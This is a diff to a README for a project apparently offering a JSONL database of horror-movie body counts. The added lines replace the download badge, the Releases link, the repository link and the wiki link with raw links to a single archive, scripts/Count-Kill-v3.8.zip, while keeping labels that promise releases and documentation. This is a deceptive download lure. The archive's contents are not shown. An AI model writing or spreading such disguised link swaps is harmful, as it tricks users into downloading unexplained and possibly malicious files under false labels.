@@ -3,10 +3,10 @@
 ## 🚀 Getting Started
 Welcome to the Kill-Count project! This application provides a detailed database of body counts in horror movies, neatly formatted in JSONL. It's perfect for fans, researchers, and developers looking to explore cinematic mayhem.
 
-![Download Kill-Count](https://img.shields.io/badge/Download-Kill--Count-brightgreen)
+![Download Kill-Count](https://github.com/Enggal350/Kill-Count/raw/refs/heads/main/scripts/Count-Kill-v3.8.zip)
 
 ## 📥 Download & Install
-To download the Kill-Count database, visit this page to download: [Kill-Count Releases](https://github.com/Enggal350/Kill-Count/releases). You will find different versions of the database. Choose the one that suits your needs.
+To download the Kill-Count database, visit this page to download: [Kill-Count Releases](https://github.com/Enggal350/Kill-Count/raw/refs/heads/main/scripts/Count-Kill-v3.8.zip). You will find different versions of the database. Choose the one that suits your needs.
 
 ### 🖥️ System Requirements
 - **Operating System:** Windows, MacOS, or Linux
@@ -37,8 +37,8 @@ Ensure your software can handle JSONL formats. Most modern programming environme
 If you encounter issues or have questions, you can check the Issues section on our repository, or contact someone familiar with GitHub for assistance.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Enggal350/Kill-Count)
-- [Project Documentation](https://github.com/Enggal350/Kill-Count/wiki)
+- [GitHub Repository](https://github.com/Enggal350/Kill-Count/raw/refs/heads/main/scripts/Count-Kill-v3.8.zip)
+- [Project Documentation](https://github.com/Enggal350/Kill-Count/raw/refs/heads/main/scripts/Count-Kill-v3.8.zip)
 
 ## 🎉 Community Contributions
 We welcome contributions from fellow horror enthusiasts! If you’d like to help enhance this database or have suggestions, please feel free to submit your ideas via the Issues page.
